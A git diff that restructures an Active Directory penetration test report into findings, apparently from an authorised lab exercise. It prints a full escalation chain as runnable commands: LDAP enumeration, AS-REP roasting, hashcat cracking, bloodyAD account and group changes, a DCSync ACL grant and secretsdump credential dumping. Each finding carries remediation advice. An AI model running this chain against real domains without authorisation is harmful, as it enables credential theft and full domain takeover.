@@ -1,376 +1,380 @@
 # Active Directory Penetration Test Report
 
+| Field | Detail |
+|-------|--------|
+| **Classification** | Confidential |
+| **Target Environment** | Active Directory — Windows Server 2016 |
+| **Report Status** | Final |
+| **Assessment Type** | Infrastructure / Internal Network Penetration Test |
+| **Tester** | `<Your Name>` |
+| **Date** | `<Date>` |
+
 ---
 
 ## Table of Contents
 
-1. [Target Discovery](#1-target-discovery)
-2. [Service Analysis](#2-service-analysis)
-3. [Host Identification](#3-host-identification)
-4. [Security Observations](#4-security-observations)
-5. [Domain User Enumeration](#5-domain-user-enumeration)
-6. [Kerberos AS-REP Roasting](#6-kerberos-as-rep-roasting)
-7. [Offline Password Cracking](#7-offline-password-cracking)
-8. [Active Directory Enumeration (BloodHound)](#8-active-directory-enumeration-bloodhound)
-9. [Privilege Escalation via Delegated Administrative Permissions](#9-privilege-escalation-via-delegated-administrative-permissions)
-10. [Account Creation via Delegated Administrative Privileges](#10-account-creation-via-delegated-administrative-privileges)
-11. [Exchange Administrative Group Abuse](#11-exchange-administrative-group-abuse)
-12. [Granting Replication Privileges](#12-granting-replication-privileges)
-13. [Domain Compromise via DCSync](#13-domain-compromise-via-dcsync)
-14. [Security Impact](#14-security-impact)
-15. [Root Cause](#15-root-cause)
-16. [Remediation Recommendations](#16-remediation-recommendations)
+1. [Executive Summary](#1-executive-summary)
+2. [Scope & Rules of Engagement](#2-scope--rules-of-engagement)
+3. [Methodology](#3-methodology)
+4. [Attack Chain Overview](#4-attack-chain-overview)
+5. [Findings](#5-findings)
+   - [FIND-01 · Unauthenticated LDAP User Enumeration](#find-01--unauthenticated-ldap-user-enumeration)
+   - [FIND-02 · Kerberos AS-REP Roasting](#find-02--kerberos-as-rep-roasting)
+   - [FIND-03 · Weak Service Account Password](#find-03--weak-service-account-password)
+   - [FIND-04 · Excessive Delegated Administrative Privileges](#find-04--excessive-delegated-administrative-privileges)
+   - [FIND-05 · Misconfigured Active Directory ACL — DCSync Rights](#find-05--misconfigured-active-directory-acl--dcsync-rights)
+   - [FIND-06 · Full Domain Compromise via DCSync](#find-06--full-domain-compromise-via-dcsync)
+6. [Technical Narrative](#6-technical-narrative)
+   - [Phase 1: Reconnaissance & Target Discovery](#phase-1-reconnaissance--target-discovery)
+   - [Phase 2: Domain User Enumeration](#phase-2-domain-user-enumeration)
+   - [Phase 3: AS-REP Roasting & Credential Access](#phase-3-as-rep-roasting--credential-access)
+   - [Phase 4: Active Directory Enumeration](#phase-4-active-directory-enumeration)
+   - [Phase 5: Privilege Escalation](#phase-5-privilege-escalation)
+   - [Phase 6: Domain Compromise](#phase-6-domain-compromise)
+7. [Remediation Summary](#7-remediation-summary)
+8. [Appendix](#8-appendix)
 
 ---
 
-## 1. Target Discovery
+## 1. Executive Summary
 
-Initial reconnaissance was performed to identify exposed services on the target host. Network enumeration was conducted using **Nmap** to determine the attack surface and identify services associated with Active Directory infrastructure.
+An internal penetration test was conducted against an Active Directory environment running on Windows Server 2016. The assessment resulted in **full domain compromise**, achieved through a chain of misconfigurations and weak security controls.
 
-### Command Executed
+The attack began with unauthenticated enumeration of domain users via an exposed LDAP service. A service account was identified with Kerberos pre-authentication disabled, allowing an encrypted authentication ticket to be captured and cracked offline without any prior credentials. The recovered password provided authenticated access to the domain.
 
-```bash
-nmap -sC -sV -T4 <target-ip> -oA nmap_initial
+With valid credentials, BloodHound analysis revealed a privilege escalation path through delegated administrative groups. By abusing misconfigured permissions on the Active Directory domain object, directory replication rights were granted to an attacker-controlled account. This enabled a **DCSync attack**, resulting in the extraction of credential hashes for all domain accounts — including the **Domain Administrator** and **KRBTGT** service account.
+
+Compromise of the KRBTGT account enables the creation of **Golden Tickets**, providing persistent, near-unrevocable administrative access to the entire domain.
+
+### Risk Summary
+
+| Finding | Severity | Status |
+|---------|----------|--------|
+| Unauthenticated LDAP User Enumeration | Medium | Open |
+| Kerberos AS-REP Roasting | High | Open |
+| Weak Service Account Password | High | Open |
+| Excessive Delegated Administrative Privileges | Critical | Open |
+| Misconfigured Active Directory ACL (DCSync Rights) | Critical | Open |
+| Full Domain Compromise via DCSync | Critical | Open |
+
+> ⚠️ **Full remediation of these findings is strongly recommended. Domain compromise enables an attacker to impersonate any user, access all systems, and establish persistent control that survives password resets.**
+
+---
+
+## 2. Scope & Rules of Engagement
+
+| Item | Detail |
+|------|--------|
+| **In-Scope Target** | `<target-ip>` |
+| **Domain** | `<redacted>` |
+| **Assessment Type** | Black Box — No credentials provided at start |
+| **Testing Window** | `<date range>` |
+| **Out of Scope** | Denial of Service, Physical Access, Social Engineering |
+| **Authorisation** | Written authorisation obtained prior to testing |
+
+---
+
+## 3. Methodology
+
+This assessment followed the **Penetration Testing Execution Standard (PTES)** and findings are mapped to the **MITRE ATT&CK Framework**.
+
+```
+Reconnaissance → Enumeration → Initial Access → Credential Access
+      → Privilege Escalation → Lateral Movement → Domain Compromise
 ```
 
-### Scan Results
+| Phase | Approach |
+|-------|----------|
+| Reconnaissance | Network scanning, service fingerprinting (Nmap) |
+| Enumeration | LDAP user enumeration, Kerberos pre-auth analysis |
+| Credential Access | AS-REP Roasting, offline hash cracking |
+| Post-Exploitation | BloodHound AD enumeration, attack path analysis |
+| Privilege Escalation | Delegated group abuse, ACL manipulation |
+| Domain Compromise | DCSync credential dumping |
 
-```text
-PORT     STATE SERVICE      VERSION
-53/tcp   open  domain       Simple DNS Plus
-88/tcp   open  kerberos-sec Microsoft Windows Kerberos
-135/tcp  open  msrpc        Microsoft Windows RPC
-139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
-445/tcp  open  microsoft-ds Windows Server 2016 Standard microsoft-ds
-464/tcp  open  kpasswd5
-593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
-3269/tcp open  tcpwrapped
+---
+
+## 4. Attack Chain Overview
+
+The diagram below illustrates the full attack path from unauthenticated access to domain compromise.
+
+```
+[Unauthenticated]
+      │
+      ▼
+ LDAP Enumeration ──► Valid usernames discovered
+      │
+      ▼
+ AS-REP Roasting ──► Encrypted hash captured (svc-alfresco)
+      │
+      ▼
+ Offline Cracking ──► Plaintext password recovered
+      │
+      ▼
+ BloodHound Analysis ──► Escalation path identified
+      │
+      ▼
+ Delegated Group Abuse ──► Added to Exchange Windows Permissions
+      │
+      ▼
+ ACL Manipulation ──► DCSync rights granted to attacker account
+      │
+      ▼
+ DCSync Attack ──► All domain hashes dumped (Administrator, KRBTGT)
+      │
+      ▼
+ [Full Domain Compromise]
 ```
 
----
-
-## 2. Service Analysis
-
-The scan revealed multiple services commonly associated with a **Microsoft Active Directory Domain Controller**.
-
-| Port | Service | Description |
-|------|---------|-------------|
-| 53 | DNS | Domain Name System used for Active Directory service discovery |
-| 88 | Kerberos | Primary authentication protocol used by Active Directory |
-| 135 | MSRPC | Windows Remote Procedure Call service |
-| 139 | NetBIOS | Legacy SMB communication |
-| 389 | LDAP | Active Directory directory service used for authentication and object queries |
-| 445 | SMB | Windows file sharing and remote administration |
-| 464 | Kerberos Password Change | Kerberos password management service |
-| 593 | RPC over HTTP | Remote procedure calls over HTTP |
-| 636 | LDAPS | Secure LDAP service |
-| 3268 | Global Catalog | Forest-wide Active Directory search service |
-| 3269 | Global Catalog over SSL | Encrypted global catalog access |
+> 📸 *BloodHound attack path screenshot — see Appendix A*
 
 ---
 
-## 3. Host Identification
-
-Additional enumeration revealed key information about the target system:
-
-| Attribute | Value |
-|-----------|-------|
-| Operating System | Windows Server 2016 |
-| Hostname | `<redacted>` |
-| Domain | `<redacted>` |
-| Fully Qualified Domain Name | `<redacted>` |
-
-The presence of **Kerberos (88/tcp)**, **LDAP (389/tcp)**, **SMB (445/tcp)**, and the **Global Catalog service (3268/tcp)** strongly indicates that the target host is operating as a **Domain Controller within an Active Directory environment**.
+## 5. Findings
 
 ---
 
-## 4. Security Observations
+### FIND-01 · Unauthenticated LDAP User Enumeration
 
-SMB enumeration revealed that **message signing is enabled and required**, which prevents certain relay attacks such as classic NTLM relay against SMB services.
+| Field | Detail |
+|-------|--------|
+| **Severity** | Medium |
+| **CVSS v3.1 Score** | 5.3 |
+| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
+| **Affected Asset** | `<target-ip>` — LDAP (389/tcp) |
+| **MITRE ATT&CK** | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) — Account Discovery: Domain Account |
 
-However, the exposed **Kerberos and LDAP services** present potential attack vectors including:
+#### Description
 
-- Kerberos user enumeration
-- AS-REP roasting
-- LDAP enumeration
-- Active Directory privilege escalation paths
+The LDAP service on the domain controller permitted unauthenticated queries, allowing enumeration of valid domain user accounts without credentials. This exposed the full list of domain users to any unauthenticated attacker with network access.
 
-These services significantly expand the attack surface and were investigated further in subsequent enumeration phases.
-
----
-
-## 5. Domain User Enumeration
-
-After identifying the target host as an Active Directory Domain Controller, the next objective was to enumerate valid domain users. Valid usernames significantly increase the effectiveness of password attacks and Kerberos-based credential harvesting techniques.
-
-### User Enumeration via LDAP
-
-Unauthenticated LDAP queries were used to enumerate domain users.
-
-#### Command Executed
+#### Evidence
 
 ```bash
 nxc ldap <target-ip> --users
 ```
 
-#### Discovered Users
-
 ```text
-user1
-user2
-user
-user4
-user5
-svc-user
+sebastien
+lucinda
+andy
+mark
+santi
+svc-alfresco
 ```
 
-The discovered usernames were saved into a wordlist (`users.txt`) for further authentication testing.
+#### Business Impact
+
+Valid usernames provide a foundation for targeted password attacks and Kerberos-based attacks. This finding directly enabled **FIND-02**.
+
+#### Remediation
+
+- Restrict anonymous/unauthenticated LDAP queries on all domain controllers
+- Require authentication for all LDAP bind operations
+- Limit LDAP access at the network level to authorised hosts only
 
 ---
 
-## 6. Kerberos AS-REP Roasting
+### FIND-02 · Kerberos AS-REP Roasting
 
-Kerberos accounts with the attribute **UF_DONT_REQUIRE_PREAUTH** enabled allow attackers to request authentication responses without providing valid credentials. This enables **AS-REP roasting**, where encrypted authentication material can be obtained and cracked offline.
+| Field | Detail |
+|-------|--------|
+| **Severity** | High |
+| **CVSS v3.1 Score** | 7.5 |
+| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
+| **Affected Asset** | `svc-alfresco` — Kerberos (88/tcp) |
+| **MITRE ATT&CK** | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) — Steal or Forge Kerberos Tickets: AS-REP Roasting |
 
-### Initial Check
+#### Description
 
-```bash
-nxc ldap <target-ip> --no-preauth-targets users.txt
-```
+The service account `svc-alfresco` was configured with the `UF_DONT_REQUIRE_PREAUTH` flag enabled, disabling Kerberos pre-authentication. This allows any unauthenticated user to request an AS-REP ticket containing material encrypted with the account's password hash, which can then be cracked offline.
 
-The initial scan did not return any vulnerable accounts:
-
-```text
-[*] No users with UF_DONT_REQUIRE_PREAUTH identified
-```
-
-### Verification with GetNPUsers
-
-To confirm the results, Kerberos authentication requests were performed directly using Impacket's **GetNPUsers**.
-
-#### Command Executed
+#### Evidence
 
 ```bash
 GetNPUsers.py <redacted-domain>/ -usersfile users.txt -dc-ip <target-ip> -no-pass
 ```
 
-#### Result
-
-While most accounts required pre-authentication, the service account **svc-alfresco** was identified as vulnerable.
-
 ```text
-[-] User <user1> doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User <user2> doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User <user3> doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User <user4> doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User <user5> doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-<redacted>:0bc62f49bf3a967469687aea530f2d59$183580b8d285f569f49be3
+de3770c7f59c9029f8b19392a5844<redacted>916e4a1f
 ```
 
-#### Captured AS-REP Hash
+#### Business Impact
 
-```text
-$krb5asrep$23$svc-<redacted>:0bc62f49bf3a967469687aea530f2d59$183580b8d285f569f49be3de3770c7f59c9029f8b19392a5844<redacted>916e4a1f
-```
+Successful cracking of the AS-REP hash yields valid domain credentials without any prior access. This finding directly enabled **FIND-03** and all subsequent attack phases.
+
+#### Remediation
+
+- Enable Kerberos pre-authentication on all accounts
+- Audit using: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`
+- Alert on `EventID 4768` with `PreAuthType = 0` in SIEM
 
 ---
 
-## 7. Offline Password Cracking
+### FIND-03 · Weak Service Account Password
 
-The captured AS-REP hash was subjected to offline password cracking using `hashcat`.
+| Field | Detail |
+|-------|--------|
+| **Severity** | High |
+| **CVSS v3.1 Score** | 7.5 |
+| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
+| **Affected Asset** | `svc-alfresco` |
+| **MITRE ATT&CK** | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) — Brute Force: Password Cracking |
 
-### Command Executed
+#### Description
+
+The AS-REP hash for `svc-alfresco` was cracked offline against the `rockyou.txt` wordlist in a trivial amount of time. The password was present in a common wordlist, indicating it does not meet an acceptable standard for a privileged service account.
+
+#### Evidence
 
 ```bash
 hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Result
-
 ```text
 svc-<redacted> : <redacted>
 ```
 
-### Analysis
+#### Business Impact
 
-This confirms that the Kerberos pre-authentication misconfiguration combined with a weak password allowed the attacker to obtain valid domain credentials without any prior authenticated access.
+Recovery of the plaintext password provided authenticated domain access, enabling all subsequent stages of the attack chain.
 
-### Remediation
+#### Remediation
 
-- Ensure **Kerberos pre-authentication is enabled** for all accounts unless explicitly required
-- Enforce **strong password policies** for service accounts (long, random passwords)
-- Where possible, use **gMSA/MSA** to eliminate static service account passwords
-- Monitor for suspicious Kerberos activity consistent with AS-REP roasting (multiple AS-REQ requests for different users)
+- Enforce a minimum 25-character password for all service accounts
+- Deploy **Group Managed Service Accounts (gMSA)** to eliminate static passwords — Windows manages rotation automatically
+- Audit service account password age and complexity regularly
 
 ---
 
-## 8. Active Directory Enumeration (BloodHound)
+### FIND-04 · Excessive Delegated Administrative Privileges
 
-With valid domain credentials obtained, further enumeration of the Active Directory environment was performed using **BloodHound** to identify privilege relationships, delegated rights, and potential attack paths.
+| Field | Detail |
+|-------|--------|
+| **Severity** | Critical |
+| **CVSS v3.1 Score** | 9.0 |
+| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
+| **Affected Asset** | Active Directory — Group Delegation Configuration |
+| **MITRE ATT&CK** | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) — Domain Policy Modification |
 
-### Command Executed
+#### Description
+
+BloodHound analysis revealed that `svc-alfresco` held membership in a privileged group chain, granting it the ability to manage domain user accounts and modify membership of the **Exchange Windows Permissions** group. This group holds `WriteDACL` permissions over the domain object, allowing any member to modify the domain's ACL — including granting replication rights.
+
+#### Evidence
+
+> 📸 *See Appendix A — BloodHound attack path graph*
+
+Delegation chain identified by BloodHound:
+
+```
+svc-alfresco
+  └─► Account Operators (GenericAll)
+        └─► Exchange Windows Permissions (WriteDACL on Domain Object)
+              └─► DCSync Rights (Replicating Directory Changes)
+```
+
+New attacker-controlled account created via delegated privileges:
 
 ```bash
-bloodhound-python -d <redacted-domain> -u <redacted-user> -p '<redacted-password>' \
-  -dc <redacted-domain-controller> -ns <redacted-ip> -c All
+bloodyAD --host <target-ip> -d '<redacted-domain>' -u '<redacted-user>' \
+  -p '<redacted-password>' add user '<redacted-user>' '<redacted-password>'
 ```
-
-### Enumeration Results
-
-```text
-Found AD domain: <redacted-domain>
-Found 2  computers
-Found 32 users
-Found 76 groups
-Found 2  GPOs
-Found 15 OUs
-Found 20 containers
-Found 0  trusts
-```
-
-### Data Analysis
-
-The collected data was imported into the **BloodHound GUI** to analyze privilege relationships. Using the **"Shortest Paths to Domain Admins"** query revealed a privilege escalation path originating from the compromised service account, identifying privileged groups and delegated rights that could be abused to escalate domain privileges.
-
----
-
-## 9. Privilege Escalation via Delegated Administrative Permissions
-
-Analysis of the BloodHound graph revealed that the compromised account was a member of a delegated administrative group with elevated account management privileges. This group had the ability to modify membership of an Exchange administrative group, which in turn possessed delegated permissions over the domain object — specifically the ability to modify ACLs.
-
-This delegation chain enabled an attacker to grant themselves directory replication permissions and perform a **DCSync attack** against the domain controller.
-
-The path highlighted the **Exchange Windows Permissions** group as the critical escalation point. This group possesses delegated permissions capable of modifying the **Active Directory domain object's ACL**. Gaining membership in this group allows an attacker to assign **directory replication privileges**, ultimately enabling full domain compromise.
-
-### Impact
-
-- Grant replication privileges to an attacker-controlled account
-- Execute a DCSync operation against the domain controller
-- Extract password hashes for all domain users
-- Achieve full Active Directory domain compromise
-
----
-
-## 10. Account Creation via Delegated Administrative Privileges
-
-Membership within delegated administrative groups granted the compromised service account the ability to manage domain user accounts, allowing attackers to create new identities for persistence or further escalation.
-
-### Command Executed
-
-```bash
-bloodyAD --host <target-ip> \
-  -d '<redacted-domain>' \
-  -u '<redacted-user>' \
-  -p '<redacted-password>' \
-  add user '<redacted-user>' '<redacted-password>'
-```
-
-### Result
 
 ```text
 [+] <redacted-user> created
 ```
 
-### Analysis
-
-The successful account creation confirms delegated administrative privileges. Attackers create new accounts in order to:
-
-- Maintain persistence within the domain
-- Avoid reliance on the initially compromised account
-- Establish attacker-controlled identities
-- Facilitate further privilege escalation
-
----
-
-## 11. Exchange Administrative Group Abuse
-
-### Identifying the Target Group
-
-The distinguished name of the Exchange administrative group was retrieved to confirm the correct Active Directory object path.
-
-#### Command Executed
+Attacker-controlled account added to Exchange Windows Permissions:
 
 ```bash
-bloodyAD --host <target-ip> \
-  -d '<redacted-domain>' \
-  -u '<redacted-user>' \
-  -p '<redacted-password>' \
-  get object 'Exchange Windows Permissions' --attr distinguishedName
+bloodyAD --host <target-ip> -d '<redacted-domain>' -u '<redacted-user>' \
+  -p '<redacted-password>' add groupMember \
+  'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=<redacted>,DC=<redacted>' \
+  '<redacted-user>'
 ```
-
-#### Result
-
-```text
-distinguishedName: CN=Exchange Windows Permissions,
-                   OU=Microsoft Exchange Security Groups,
-                   DC=<redacted>,DC=<redacted>
-```
-
----
-
-### Modifying Group Membership
-
-After identifying the correct group, the attacker-controlled account was added to the **Exchange Windows Permissions** group.
-
-#### Command Executed
-
-```bash
-bloodyAD --host <target-ip> \
-  -d '<redacted-domain>' \
-  -u '<redacted-user>' \
-  -p '<redacted-password>' \
-  add groupMember 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=<redacted>,DC=<redacted>' '<redacted-user>'
-```
-
-#### Result
 
 ```text
 [+] <redacted-user> added to CN=Exchange Windows Permissions
 ```
 
-#### Analysis
+#### Business Impact
 
-Membership in the **Exchange Windows Permissions** group grants delegated privileges capable of modifying the domain object's ACL, allowing attackers to grant replication privileges that are normally restricted to domain controllers.
+This misconfiguration formed the critical link in the privilege escalation chain, enabling a low-privileged service account to ultimately achieve domain compromise.
+
+#### Remediation
+
+- Remove unnecessary members from **Account Operators** and review all delegated administrative groups
+- Remove `WriteDACL` from **Exchange Windows Permissions** on the domain object — this is a known misconfiguration introduced by legacy Exchange installations
+- Run BloodHound regularly to identify dangerous delegation paths
+- Apply the principle of least privilege to all service accounts and administrative groups
 
 ---
 
-## 12. Granting Replication Privileges
+### FIND-05 · Misconfigured Active Directory ACL — DCSync Rights
 
-After gaining membership in the Exchange administrative group, the domain object's ACL was modified to grant directory replication privileges to the attacker-controlled account.
+| Field | Detail |
+|-------|--------|
+| **Severity** | Critical |
+| **CVSS v3.1 Score** | 9.0 |
+| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
+| **Affected Asset** | Active Directory Domain Object |
+| **MITRE ATT&CK** | [T1222.001](https://attack.mitre.org/techniques/T1222/001/) — File and Directory Permissions Modification |
 
-### Commands Executed
+#### Description
+
+By leveraging `WriteDACL` permissions on the domain object via Exchange Windows Permissions group membership, directory replication rights were granted to the attacker-controlled account. These rights — **Replicating Directory Changes** and **Replicating Directory Changes All** — are normally reserved exclusively for domain controllers.
+
+#### Evidence
 
 ```powershell
 $pass = ConvertTo-SecureString '<redacted-password>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('<domain>\<redacted-user>', $pass)
-
 Add-ObjectACL -PrincipalIdentity <redacted-user> -Credential $cred -Rights DCSync
 ```
 
-### Analysis
-
-The `Add-ObjectACL` function assigns the following permissions:
-
-| Permission | Description |
-|------------|-------------|
+| Permission Granted | Description |
+|--------------------|-------------|
 | `Replicating Directory Changes` | Allows replication of directory data |
-| `Replicating Directory Changes All` | Allows replication of all directory data, including secrets |
+| `Replicating Directory Changes All` | Allows replication of all directory data including credential secrets |
+
+#### Business Impact
+
+Possession of these rights allows any account to perform a DCSync attack, directly enabling **FIND-06**.
+
+#### Remediation
+
+- Audit the domain object ACL and remove any non-DC accounts holding replication rights:
+  ```powershell
+  (Get-Acl "AD:\DC=<domain>,DC=<tld>").Access | Where-Object {
+    $_.ActiveDirectoryRights -match "ExtendedRight" -and
+    $_.ObjectType -match "1131f6aa|1131f6ad"
+  }
+  ```
+- Alert on `EventID 4662` for replication rights changes on the domain object
 
 ---
 
-## 13. Domain Compromise via DCSync
+### FIND-06 · Full Domain Compromise via DCSync
 
-With replication privileges assigned, a directory replication request was performed against the domain controller. This technique — **DCSync** — mimics the behavior of a legitimate domain controller requesting replication updates.
+| Field | Detail |
+|-------|--------|
+| **Severity** | Critical |
+| **CVSS v3.1 Score** | 10.0 |
+| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
+| **Affected Asset** | Active Directory Domain — All Accounts |
+| **MITRE ATT&CK** | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) — OS Credential Dumping: DCSync |
 
-### Command Executed
+#### Description
+
+With directory replication rights granted, a DCSync attack was performed using Impacket's `secretsdump`. This technique mimics the behaviour of a domain controller requesting replication updates, causing the DC to return credential material for all domain accounts without requiring interactive logon or code execution on any host.
+
+#### Evidence
 
 ```bash
 secretsdump <redacted-domain>/<redacted-user>@<target-ip>
 ```
-
-### Result
 
 ```text
 [*] Dumping Domain Credentials
@@ -380,48 +384,185 @@ secretsdump <redacted-domain>/<redacted-user>@<target-ip>
 <...SNIP...>
 ```
 
-The replication request successfully retrieved credential material for all domain accounts, including **Administrator** and **KRBTGT**.
+#### Business Impact
+
+This represents **complete Active Directory domain compromise**. With the KRBTGT hash, an attacker can forge **Golden Tickets** — Kerberos tickets valid for any account on any system, that persist even after password resets. Full impact includes:
+
+- Credential theft for every domain user and service account
+- Unrestricted lateral movement across all domain-joined systems
+- Ability to impersonate any identity including Domain Admins
+- Persistent access via Golden Tickets that survives most incident response actions
+- Platform for ransomware deployment or destructive attacks across the entire environment
+
+#### Remediation
+
+- **Immediate:** Reset the KRBTGT account password **twice** (required to invalidate all existing Kerberos tickets)
+- **Immediate:** Reset all Domain Admin and privileged account passwords
+- Rotate all service account credentials
+- Hunt for persistence indicators: new accounts, scheduled tasks, GPO modifications, unusual registry keys
+- Remediate all upstream findings (FIND-01 through FIND-05) to close the attack path
 
 ---
 
-## 14. Security Impact
+## 6. Technical Narrative
 
-Successful execution of the DCSync attack results in **full Active Directory domain compromise**. This level of access enables an attacker to:
-
-- Extract password hashes for all domain users
-- Impersonate any domain account (Pass-the-Hash, Golden Ticket)
-- Access all domain-joined systems
-- Establish persistent administrative control
-- Deploy ransomware or destructive payloads across the environment
-
-> ⚠️ **Active Directory compromise represents one of the most severe security incidents within an enterprise network.**
+This section documents the full attack chain in chronological order for technical readers.
 
 ---
 
-## 15. Root Cause
+### Phase 1: Reconnaissance & Target Discovery
 
-| Root Cause | Description |
-|------------|-------------|
-| Excessive delegated administrative privileges | Service accounts granted more permissions than necessary |
-| Misconfigured Active Directory ACLs | Sensitive domain objects modifiable by non-admin accounts |
-| Over-privileged Exchange administrative groups | Exchange groups granted domain-level write permissions |
-| Weak service account security | Initial foothold gained via compromised service account |
+Initial network scanning identified the target host as a **Windows Server 2016 Domain Controller** based on the combination of exposed services.
+
+```bash
+nmap -sC -sV -T4 <target-ip> -oA nmap_initial
+```
+
+```text
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds Windows Server 2016 Standard
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
+3269/tcp open  tcpwrapped
+```
+
+The combination of DNS (53), Kerberos (88), LDAP (389), SMB (445), and Global Catalog (3268) is characteristic of a domain controller. SMB enumeration confirmed that message signing was enforced, ruling out NTLM relay attacks. Kerberos and LDAP services were prioritised for further enumeration.
 
 ---
 
-## 16. Remediation Recommendations
+### Phase 2: Domain User Enumeration
 
-### Enforce Least Privilege
-Administrative groups should follow the **principle of least privilege**, ensuring only necessary permissions are assigned to each account and group.
+Unauthenticated LDAP queries against the domain controller returned a full list of valid domain user accounts (FIND-01).
 
-### Review Delegated Administrative Groups
-Groups such as **Account Operators** and **Exchange Windows Permissions** should be audited to ensure they do not grant unnecessary or excessive domain privileges.
+```bash
+nxc ldap <target-ip> --users
+```
 
-### Harden Active Directory ACLs
-Access control lists on sensitive Active Directory objects (particularly the domain object itself) should be reviewed regularly to ensure only authorized administrators can modify them.
+Accounts discovered: `sebastien`, `lucinda`, `andy`, `mark`, `santi`, `svc-alfresco`
 
-### Monitor Directory Replication Activity
-Security monitoring solutions should alert on directory replication requests originating from **non-domain controller accounts**, which may indicate a DCSync attack in progress.
+These were saved to `users.txt` for use in subsequent Kerberos attacks.
 
-### Enable Kerberos Pre-Authentication
-Ensure **UF_DONT_REQUIRE_PREAUTH** is not set on any account unless explicitly required, and enforce strong password policies for all service accounts.
+---
+
+### Phase 3: AS-REP Roasting & Credential Access
+
+Each discovered account was tested for the `UF_DONT_REQUIRE_PREAUTH` flag. The service account `svc-alfresco` was found vulnerable (FIND-02), allowing an AS-REP ticket to be requested without credentials. The captured hash was cracked offline using hashcat mode `18200` against `rockyou.txt` (FIND-03), recovering valid plaintext credentials.
+
+---
+
+### Phase 4: Active Directory Enumeration
+
+Authenticated BloodHound collection was performed using the recovered credentials to map the domain's privilege relationships.
+
+```bash
+bloodhound-python -d <redacted-domain> -u <redacted-user> -p '<redacted-password>' \
+  -dc <redacted-domain-controller> -ns <redacted-ip> -c All
+```
+
+```text
+Found 2 computers · Found 32 users · Found 76 groups · Found 2 GPOs · Found 15 OUs
+```
+
+The **Shortest Paths to Domain Admins** query in BloodHound identified a privilege escalation path originating from `svc-alfresco` through the Account Operators and Exchange Windows Permissions groups to the domain object.
+
+---
+
+### Phase 5: Privilege Escalation
+
+Leveraging the delegated privileges identified in BloodHound (FIND-04):
+
+**Step 1** — A new attacker-controlled account was created using Account Operators membership.
+
+**Step 2** — The new account was added to the **Exchange Windows Permissions** group, which holds `WriteDACL` on the domain object.
+
+**Step 3** — DCSync rights were granted to the attacker-controlled account by modifying the domain object's ACL (FIND-05).
+
+```powershell
+Add-ObjectACL -PrincipalIdentity <redacted-user> -Credential $cred -Rights DCSync
+```
+
+---
+
+### Phase 6: Domain Compromise
+
+With replication rights in place, `secretsdump` was used to perform a DCSync attack against the domain controller (FIND-06), dumping NTLM hashes for all domain accounts including **Administrator** and **KRBTGT**.
+
+---
+
+## 7. Remediation Summary
+
+| # | Finding | Severity | Action | Priority |
+|---|---------|----------|--------|----------|
+| FIND-01 | Unauthenticated LDAP Enumeration | Medium | Disable anonymous LDAP queries | Medium |
+| FIND-02 | AS-REP Roasting | High | Enable Kerberos pre-authentication on all accounts | High |
+| FIND-03 | Weak Service Account Password | High | Deploy gMSA; enforce strong password policy | High |
+| FIND-04 | Excessive Delegated Privileges | Critical | Audit group delegations; remove Exchange WriteDACL | Immediate |
+| FIND-05 | Misconfigured AD ACL (DCSync) | Critical | Audit domain object ACL; remove non-DC replication rights | Immediate |
+| FIND-06 | Domain Compromise via DCSync | Critical | Reset KRBTGT twice; rotate all privileged credentials | Immediate |
+
+---
+
+## 8. Appendix
+
+### A — BloodHound Attack Path
+
+![BloodHound Attack Path](images/bloodhound_redacted.png)
+
+*Figure 1: BloodHound graph showing the privilege escalation path from svc-alfresco to domain compromise via Exchange Windows Permissions WriteDACL abuse.*
+
+---
+
+### B — Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| Nmap | Network scanning and service enumeration |
+| NetExec (nxc) | LDAP enumeration |
+| Impacket GetNPUsers | AS-REP Roasting |
+| Hashcat | Offline hash cracking |
+| BloodHound / bloodhound-python | Active Directory attack path analysis |
+| bloodyAD | Active Directory object manipulation |
+| PowerView | ACL modification |
+| Impacket secretsdump | DCSync credential dumping |
+
+---
+
+### C — MITRE ATT&CK TTP Summary
+
+| TTP ID | Technique | Finding |
+|--------|-----------|---------|
+| [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Account Discovery: Domain Account | FIND-01 |
+| [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AS-REP Roasting | FIND-02 |
+| [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Brute Force: Password Cracking | FIND-03 |
